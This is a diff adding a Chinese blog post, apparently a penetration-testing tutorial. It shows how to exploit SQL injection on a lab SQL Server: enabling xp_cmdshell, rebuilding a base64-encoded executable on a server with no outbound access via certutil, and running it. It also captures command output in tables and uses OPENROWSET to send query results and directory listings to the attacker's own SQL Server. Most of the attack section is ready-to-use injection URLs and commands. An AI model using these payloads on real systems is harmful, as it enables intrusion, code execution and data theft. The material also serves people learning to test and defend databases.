@@ -1,0 +1,1551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>sqlserver注入执行命令和写入exe的一些方法技巧 - 我的小blog</title>
+  
+    <meta name="keywords" content="sqlserver注入执行命令">
+  
+
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="我的小blog" type="application/atom+xml">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+            <img no-lazy class='logo' src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
+          
+          
+          
+            我的小blog
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+      <img no-lazy class='logo' src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-Cover@3x.png'/>
+    
+    
+      <p class="title">我的小blog</p>
+    
+    
+	<!-- 封面滚动字体 -->
+<div id="binft"></div> 
+<script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["山有木兮木有枝，心悦君兮君不知。", "人生若只如初见，何事秋风悲画扇。","十年生死两茫茫，不思量，自难忘。", "曾经沧海难为水，除却巫山不是云。","洛中何郁郁，冠带自相索。","只愿君心似我心，定不负相思意。","愿得一心人，白头不相离。","入我相思门，知我相思苦。"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/"
+              
+              
+              id="home">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f5c3.svg'><p>文章</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        sqlserver注入执行命令和写入exe的一些方法技巧
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>gun97</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年6月25日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="sqlserver注入执行命令和写入exe的一些方法技巧" data-path="/2021/06/25/sqlserver/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <p><strong>Mssql站库分离，sa权限注入,能正常执行命令,system权限,数据库服务器不出网，写入exe并执行命令的一些思路:</strong></p>
+<p><strong>实验环境：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务器：OS：win2012r2 	ip:192.168.31.89(外) ip:172.16.32.28(内) php-5.4.45</span><br><span class="line">数据库服务器：OS:win2012r2	ip:172.16.32.25(内) sqlserver2008r2</span><br><span class="line">攻击机：OS:win10	ip:192.168.31.122</span><br></pre></td></tr></table></figure>
+<p>首先判断注入，我这里直接用sqlmap：<br><img src="/2021/06/25/sqlserver/1.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p>
+<p>然后判断是否站库分离：根据结果判断是否分离，结果一样就可能站库同服务器，结果不一样就可能是站库分离：</p>
+<p>得到客户端主机名:select host_name();    web服务器的主机名</p>
+<p><code>http://192.168.31.89/sqli.php?id=-5+UNION+ALL+SELECT+host_name(),null,null--+-</code><br><img src="/2021/06/25/sqlserver/2.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p>
+<p>得到服务端主机名: select @@servername;sqlserver服务器的主机名</p>
+<p><code>http://192.168.31.89/sqli.php?id=-5+UNION+ALL+SELECT+@@servername,null,null--+-</code><br><img src="/2021/06/25/sqlserver/3.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3"></p>
+<h1 id="在不出网的数据库服务器上写入exe"><a href="#在不出网的数据库服务器上写入exe" class="headerlink" title="在不出网的数据库服务器上写入exe:"></a>在不出网的数据库服务器上写入exe:</h1><h2 id="1、开启xp-cmdshell"><a href="#1、开启xp-cmdshell" class="headerlink" title="1、开启xp_cmdshell"></a>1、开启xp_cmdshell</h2><p><code>http://192.168.31.89/sqli.php?id=5 exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code><br><img src="/2021/06/25/sqlserver/4.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4"></p>
+<h2 id="2、写入exe"><a href="#2、写入exe" class="headerlink" title="2、写入exe:"></a>2、写入exe:</h2><p>这里可以在攻击机上利用powershell或者certutil或者其他工具将exe进行base64编码或者hex编码：</p>
+<p>用powershell将exe进行base64编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; <span class="variable">$PEBytes</span> = [IO.File]::ReadAllBytes(<span class="string">&#x27;1.exe&#x27;</span>); </span><br><span class="line">PS &gt; <span class="variable">$Base64String</span> = [System.Convert]::ToBase64String(<span class="variable">$PEBytes</span>); </span><br><span class="line">PS &gt; <span class="variable">$Base64String</span> | Out-File -FilePath bs64.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/5.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5"></p>
+<p>或者用certuitl将exe进行base64编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certutil –encode 1.exe 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/6.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="6"></p>
+<p>然后利用xp_cmdshell把base64内容输出到数据库服务器上的一个txt文本，并使用certutil解码转换回exe：</p>
+<p>可以用echo也可以用set，但是echo是有长度限制的而且还会自动分行，一般用set：因为上面的1.exe编码后的内容太多了，所以我这里只是演示一下怎么传输到服务器上而并没有把整个1.exe的内容传输进去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;&gt;&gt;c:\windows\temp\vars.txt set /p=&quot;TVqQAAMAAAAEAAAA//8AAL&quot; &lt;nul&#x27;</span>; </span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;&gt;&gt;c:\windows\temp\vars.txt set /p=&quot;jZlG5ukKUXlIV9QTUgdowg&quot; &lt;nul&#x27;</span>; </span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;&gt;&gt;c:\windows\temp\vars.txt set /p=&quot;CDtIBDgCIo2ve+ZJGkABCx&quot; &lt;nul&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/7.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="7"></p>
+<p>然后使用certutil解码转换回exe：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;CertUtil -decode c:\windows\temp\vars.txt c:\windows\temp\res.exe&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/8.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8"></p>
+<p>这里提一下利用certutil将exe进行base64编码和解码的过程：<br><img src="/2021/06/25/sqlserver/9.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="9"></p>
+<p>需要验证解码后的exe与原来的exe的md5hash值是否一致.</p>
+<h3 id="certutil突破上传文件大小及后缀限制："><a href="#certutil突破上传文件大小及后缀限制：" class="headerlink" title="certutil突破上传文件大小及后缀限制："></a>certutil突破上传文件大小及后缀限制：</h3><p>可以先本地先把exe进行base64编码：certutil -encode xxx.exe xxx.txt,然后把xxx.txt拆分成两半1.txt、2.txt，手动两个文件都补全—–BEGIN CERTIFICATE—–，—–END CERTIFICATE—–开关结尾或者把—–BEGIN CERTIFICATE—–和—–END CERTIFICATE—–删掉。总之保证生成exe再合成的md5不变.</p>
+<p>然后上传至目标机器：<br>然后分别解码为exe：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -decode 1.txt 1.exe  </span><br><span class="line">certutil -decode 2.txt 2.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后把两个exe合并成为一个：这里的顺序有规定：xxx.txt拆分的上半部分解码的exe+xxx.txt拆分的下半部分解码的exe，如果顺序调转则合成后的MD5会变.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /B 1.exe+2.exe 3.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后查看合并后的exe的MD5跟原来的exe是否一致：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile 3.exe MD5</span><br><span class="line">certutil -hashfile xxx.exe MD5</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/10.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="10"></p>
+<h2 id="3-利用xp-cmdshell执行exe"><a href="#3-利用xp-cmdshell执行exe" class="headerlink" title="3.利用xp_cmdshell执行exe:"></a>3.利用xp_cmdshell执行exe:</h2><p><code>http://192.168.31.89/sqli.php?id=5;exec master..xp_cmdshell &#39;c:\test\res.exe&#39;</code><br><img src="/2021/06/25/sqlserver/11.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/11.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="11"></p>
+<h3 id="执行命令：xp-cmdshell一般情况下是有回显的"><a href="#执行命令：xp-cmdshell一般情况下是有回显的" class="headerlink" title="执行命令：xp_cmdshell一般情况下是有回显的"></a>执行命令：xp_cmdshell一般情况下是有回显的</h3><p>机子不出网没回显：一般还可以新建一个数据表，把执行结果保存在数据表里，再去查询这个表。sqlmap的os-shell就是这个原理，新建了一个sqlmapouput的表。</p>
+<p><code>http://192.168.31.89/sqli.php?id=5;CREATE TABLE cmdtmp (dir varchar(8000));</code><br><img src="/2021/06/25/sqlserver/12.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/12.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="12"></p>
+<p>建表成功：<code>http://192.168.31.89/sqli.php?id=-5 UNION SELECT table_name,null,null from INFORMATION_SCHEMA.TABLES</code><br><img src="/2021/06/25/sqlserver/13.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/13.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="13"></p>
+<p>然后利用xp_cmdshell执行命令并把结果插进cmdtmp表里：<br><code>http://192.168.31.89/sqli.php?id=-5;insert into cmdtmp(dir) exec master..xp_cmdshell &#39;whoami&#39;</code><br><img src="/2021/06/25/sqlserver/14.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/14.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="14"></p>
+<p>然后查询cmdtmp表来获取结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from cmdtmp;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/15.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/15.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="15"></p>
+<h3 id="也可以利用sqlserver-openrowset（不需要高权限）把执行的结果转发到自己的sqlserver服务器上：不过这个只能用于目标sqlserver服务器能连上自己sqlserver服务器的情况，大概就是目标服务器出网的情况，但又没回显就可以用了"><a href="#也可以利用sqlserver-openrowset（不需要高权限）把执行的结果转发到自己的sqlserver服务器上：不过这个只能用于目标sqlserver服务器能连上自己sqlserver服务器的情况，大概就是目标服务器出网的情况，但又没回显就可以用了" class="headerlink" title="也可以利用sqlserver openrowset（不需要高权限）把执行的结果转发到自己的sqlserver服务器上：不过这个只能用于目标sqlserver服务器能连上自己sqlserver服务器的情况，大概就是目标服务器出网的情况，但又没回显就可以用了"></a>也可以利用sqlserver openrowset（不需要高权限）把执行的结果转发到自己的sqlserver服务器上：不过这个只能用于目标sqlserver服务器能连上自己sqlserver服务器的情况，大概就是目标服务器出网的情况，但又没回显就可以用了</h3><p><strong>适用于盲注入、出网但页面不返回信息</strong></p>
+<p>使用这种注入方法，需要一台带有sqlserver的机器。原理就是把当前查询的数据转发到自己远程的sqlserver上。</p>
+<p>先自己搭好一台带有SqlServer服务器：我这里是win2012r2+mssql2008r2 172.16.32.22</p>
+<p>然后开启目标数据库的Ad Hoc Distributed Queries：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,1 reconfigure</span><br><span class="line">;<span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,1 reconfigure</span><br></pre></td></tr></table></figure>
+
+<p>然后在自己搭好的sqlserver上建立一个临时表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table <span class="comment">##version (VERSION varchar(500))</span></span><br></pre></td></tr></table></figure>
+
+<p>查询系统信息，把查询的信息传到自己的sqlserver创建的临时表上：<br><code>http://192.168.31.89/sqli.php?id=-5;insert into OPENROWSET(&#39;SQLOLEDB&#39;, &#39;server=172.16.32.22;uid=sa;pwd=1qaz@WSX&#39;, &#39;select * from %23%23version&#39; ) select DB_NAME()</code><br><img src="/2021/06/25/sqlserver/16.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/16.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="16"></p>
+<p>然后在自己本地sqlserver上查询结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="comment">##version</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/17.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/17.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="17"></p>
+<h3 id="两边创建临时表："><a href="#两边创建临时表：" class="headerlink" title="两边创建临时表："></a>两边创建临时表：</h3><p><code>http://192.168.31.89/sqli.php?id=-5;create table %23%23nonamed( dir ntext, num int )</code></p>
+<p>查询路径：xp_dirtree</p>
+<p>向nonamed表插入c盘下路径的数据:<br><code>http://192.168.31.89/sqli.php?id=-5;insert %23%23nonamed execute master..xp_dirtree &#39;c:/&#39;,1</code></p>
+<p>这里就是把数据转发到远程172.16.32.22 sqlserver上:<br><code>http://192.168.31.89/sqli.php?id=-5;insert into OPENROWSET(&#39;SQLOLEDB&#39;, &#39;server=172.16.32.22;uid=sa;pwd=1qaz@WSX&#39;,&#39;select * from %23%23nonamed&#39;) select * from %23%23nonamed</code></p>
+<p>远程sqlserver执行这个命令就可以获取数据:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="comment">##nonamed</span></span><br></pre></td></tr></table></figure>
